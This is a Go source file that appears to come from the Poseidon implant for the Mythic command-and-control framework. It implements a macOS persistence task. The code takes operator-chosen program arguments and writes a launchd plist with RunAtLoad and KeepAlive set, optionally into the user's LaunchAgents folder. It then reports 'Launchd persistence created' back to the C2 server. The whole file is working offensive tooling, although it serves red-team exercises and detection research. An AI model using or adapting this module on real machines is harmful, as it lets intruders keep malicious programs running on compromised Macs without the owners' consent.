package persist_launchd

import (
	// Standard
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"sync"

	// External
	"howett.net/plist"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

var mu sync.Mutex

type Arguments struct {
	Label       string   `json:"Label"`
	ProgramArgs []string `json:"args"`
	KeepAlive   bool     `json:"KeepAlive"`
	RunAtLoad   bool     `json:"RunAtLoad"`
	Path        string   `json:"LaunchPath"`
	LocalAgent  bool     `json:"LocalAgent"`
}

type launchPlist struct {
	Label            string   `plist:"Label"`
	ProgramArguments []string `plist:"ProgramArguments"`
	RunAtLoad        bool     `plist:"RunAtLoad"`
	KeepAlive        bool     `plist:"KeepAlive"`
}

func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	var argArray []string
	argArray = append(argArray, args.ProgramArgs...)

	data := &launchPlist{
		Label:            args.Label,
		ProgramArguments: argArray,
		RunAtLoad:        args.RunAtLoad,
		KeepAlive:        args.KeepAlive,
	}

	plist, err := plist.MarshalIndent(data, plist.XMLFormat, "\t")
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	if args.LocalAgent {
		args.Path = fmt.Sprintf("~/Library/LaunchAgents/%s.plist", args.Label)
	}

	f, err := os.Create(args.Path)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	defer f.Close()

	w := bufio.NewWriter(f)
	_, err = w.WriteString(string(plist))

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
	w.Flush()

	msg.Completed = true
	msg.UserOutput = "Launchd persistence created"
	r, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, r)
	mu.Unlock()
	return
}
